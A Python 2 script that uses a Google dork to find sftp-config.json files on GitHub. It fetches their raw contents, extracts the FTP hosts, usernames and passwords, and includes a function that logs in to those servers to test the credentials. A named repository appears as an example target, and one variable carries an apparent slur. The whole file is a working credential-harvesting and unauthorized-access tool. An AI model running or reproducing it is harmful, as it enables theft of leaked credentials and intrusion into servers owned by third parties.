#!/usr/bin/python
# -*- coding: utf-8 -*-

# date: 2/02/15
# username: Righteous
# github: http://www.github.com/Righteous
# description: uses a google dork to probe github pages for
# ftp information thats out in the open

# https://github.com/NikolaiT/GoogleScraper

from xgoogle.search import GoogleSearch, SearchError

from socket import error as socket_error
from ftplib import FTP

# http://docs.python-requests.org/en/latest/

import requests

import linecache
import os
import sys
import re
import errno
import random

# config variables

results_start_page = 4
results_per_page = 5


# ftp_timeout = 15
# test_ftp = True
# ftp_info = []


##############################################################
# testFtp(host, user, pass)
# This function tries to login to a ftp server to see if its online &
# to see if the credentials work
# inputs: host -> ip/hostname of ftp server, user -> username to server
# defaults to anonymous, pass -> password to the ftp server also defaults
# to anonymous when non specified
# returns: True if its online and working, False if otherwise
# -> Still working on this <-

def testFtp(host, user, password):
    try:
        ftp_conn = FTP(host, user, password)
        ftp_conn.login()
        ftp_conn.voidcmd('NOOP')
        print 'FTP Connection Sucessful -> %s via %s:%s' % (host, user,
                password)
        return True
    except IOError, io_error:
        print 'IOError: %s ' % repr(io_error)
        return False
    except socket_error:
        if socket_error == errno.ECONNREFUSED:
            print '%s is refusing connections..' % host
            return False
        elif socket_error != errno.ECONNREFUSED:
            print 'Unknown socket error: %s' % socket_error
            return False
    except FTP.error_temp:
        print 'FTP Error: %s\nResponse code 400-499' % FTP.error_temp
        return False
    except FTP.error_perm:
        print 'FTP Error: %s\nResponse code 500-599' % FTP.error_perm
        return False
    except Exception, gn_error:
        print 'Generic Error: %s' % repr(gn_error)
        print '\n'
        return False


##############################################################
# parseJson(data)
# This function saves ftp data to a file
# inputs: data -> "json" data from specific sftp.json pages on github
# returns: host, user and pass to ftp servers publicly listed
# -> Needs more verificaiton added to make sure the variables are whats expected <-
# -> I.E matching a ip address regex or url regex on the host <-

def parseJson(data):
    data = data.split('\n')
    try:
        for line in data:
            if line.find('host') != -1:
                line_parser = re.findall(r'"(.*?)"', line)
                if len(line_parser) >= 1:
                    if line_parser[0] == "host":
                        print str(line_parser[0]) + ' : ' \
                            + str(line_parser[1])
                    else:
                        continue
            elif line.find('user') != -1:
                line_parser = re.findall(r'"(.*?)"', line)
                if len(line_parser) >= 1:
                    if line_parser[0] == "user":
                        print str(line_parser[0]) + ' : ' \
                            + str(line_parser[1])
                    else:
                        continue
            elif line.find('password') != -1:
                line_parser = re.findall(r'"(.*?)"', line)
                if len(line_parser) >= 1:
                    if line_parser[0] == "password":
                        print str(line_parser[0]) + ' : ' \
                            + str(line_parser[1])
                    else:
                        continue
    except IndexError, ie_error:
        print '[parseJson] IndexError: %s' % repr(ie_error)
        print '\n'
    except AttributeError, ab_error:
        print '[parseJson] AttributeError: %s' % repr(ab_error)
        print '\n'
    except Exception, gn_error:
        print '[parseJson] Generic Error: %s' % repr(gn_error)
        print '\n'
    else:
        print '\n'

##############################################################
# getJson(url)
# This function retrieves the json from github pages, also makes urls
# link to the raw page of github (see below for example)
# inputs: url -> url from the google url search
# returns: sftp-config.js pages
# Here is an example of a URL that goes into this function and what comes out..
# In -> https://github.com/Pragueham/thecornerwebsite/blob/master/sftp-config.json
# Out -> https://raw.githubusercontent.com/Pragueham/thecornerwebsite/master/sftp-config.json

def getJson(url):
    jew = url[18:]
    link = 'https://raw.githubusercontent.com' + jew
    link = link.replace("""/blob""", '')
    print 'Replaced Link: ' + link
    get = requests.get(link)
    parseJson(get.text)

def main():
    try:
        google_s = GoogleSearch("""site:github.com inurl:sftp-config.json""")
        google_s.results_per_page = results_per_page
        google_s.page = results_start_page
        query = google_s.get_results()
        for link in query:
            print "Query Size: %s" % (str(len(query)))
            print 'Feteched Link: ' + link.url.encode('utf8')
            getJson(link.url.encode('utf8'))
    except SearchError, q_error:
        print '[Main] Something went wrong: %s' % q_error
    except Exception, gn_error:
        print '[Main] Generic Error: %s' % repr(gn_error)
        print '\n'

main()

# https://github.com/Pragueham/thecornerwebsite/blob/master/sftp-config.json
# https://raw.githubusercontent.com/Pragueham/thecornerwebsite/master/sftp-config.json
